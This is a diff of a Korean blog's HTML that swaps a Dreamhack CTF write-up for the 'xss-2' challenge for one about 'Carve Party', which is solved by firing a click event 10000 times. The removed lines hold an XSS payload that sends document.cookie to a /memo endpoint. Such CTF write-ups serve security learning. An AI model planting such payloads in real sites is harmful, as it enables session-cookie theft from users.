@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='[문제] 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다. [해결법]'><title>[dreamhack] xss-2</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='[문제] 할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요! [해결법] JavaScript click 이벤트를 10000번 호출 하면'><title>[dreamhack] Carve Party</title>
 
-<link rel='canonical' href='https://appealso.github.io/p/dreamhack-xss-2/'>
+<link rel='canonical' href='https://appealso.github.io/p/dreamhack-carve-party/'>
 
-<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css"><meta property='og:title' content='[dreamhack] xss-2'>
-<meta property='og:description' content='[문제] 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다. [해결법]'>
-<meta property='og:url' content='https://appealso.github.io/p/dreamhack-xss-2/'>
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css"><meta property='og:title' content='[dreamhack] Carve Party'>
+<meta property='og:description' content='[문제] 할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요! [해결법] JavaScript click 이벤트를 10000번 호출 하면'>
+<meta property='og:url' content='https://appealso.github.io/p/dreamhack-carve-party/'>
 <meta property='og:site_name' content='SooHo&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='XSS' /><meta property='article:published_time' content='2021-10-05T22:28:53&#43;09:00'/><meta property='article:modified_time' content='2021-10-05T22:28:53&#43;09:00'/>
-<meta name="twitter:title" content="[dreamhack] xss-2">
-<meta name="twitter:description" content="[문제] 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다. [해결법]">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SSTI' /><meta property='article:published_time' content='2022-01-31T16:40:43&#43;09:00'/><meta property='article:modified_time' content='2022-01-31T16:40:43&#43;09:00'/>
+<meta name="twitter:title" content="[dreamhack] Carve Party">
+<meta name="twitter:description" content="[문제] 할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요! [해결법] JavaScript click 이벤트를 10000번 호출 하면">
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
 <script>
 var doNotTrack = false;
@@ -82,7 +82,7 @@ if (!doNotTrack) {
     
 
     <h2 class="article-title">
-        <a href="/p/dreamhack-xss-2/">[dreamhack] xss-2</a>
+        <a href="/p/dreamhack-carve-party/">[dreamhack] Carve Party</a>
     </h2>
 
     
@@ -100,7 +100,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 05, 2021</time>
+                <time class="article-time--published">Jan 31, 2022</time>
             </div>
         
 
@@ -127,12 +127,11 @@ if (!doNotTrack) {
     <section class="article-content">
     <h2 id="문제">[문제]</h2>
 <blockquote>
-<p>여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
-XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.</p>
+<p>할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요!</p>
 </blockquote>
 <h2 id="해결법">[해결법]</h2>
 <blockquote>
-<p>&lt;img src=&lsquo;x&rsquo; onerror=&lsquo;location.href=&quot;/memo?memo=&quot;+document.cookie;'&gt;</p>
+<p>JavaScript click 이벤트를 10000번 호출 하면되는 문제였다. 간단히 while문으로 호출해서 풀 수 있었다.</p>
 </blockquote>
 
 </section>
@@ -142,7 +141,7 @@ XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, 
     
     <section class="article-tags">
         
-            <a href="/tags/xss/">XSS</a>
+            <a href="/tags/ssti/">SSTI</a>
         
     </section>
 
@@ -176,17 +175,6 @@ XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, 
                 
                     
 <article class="">
-    <a href="/p/dreamhack-carve-party/">
-        
-        
-        <div class="article-details">
-            <h2 class="article-title">[dreamhack] Carve Party</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
     <a href="/p/dreamhack-simple-ssti/">
         
         
@@ -214,6 +202,17 @@ XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, 
         
         <div class="article-details">
             <h2 class="article-title">[dreamhack] web-misconf-1</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/dreamhack-xss-2/">
+        
+        
+        <div class="article-details">
+            <h2 class="article-title">[dreamhack] xss-2</h2>
         </div>
     </a>
 </article>
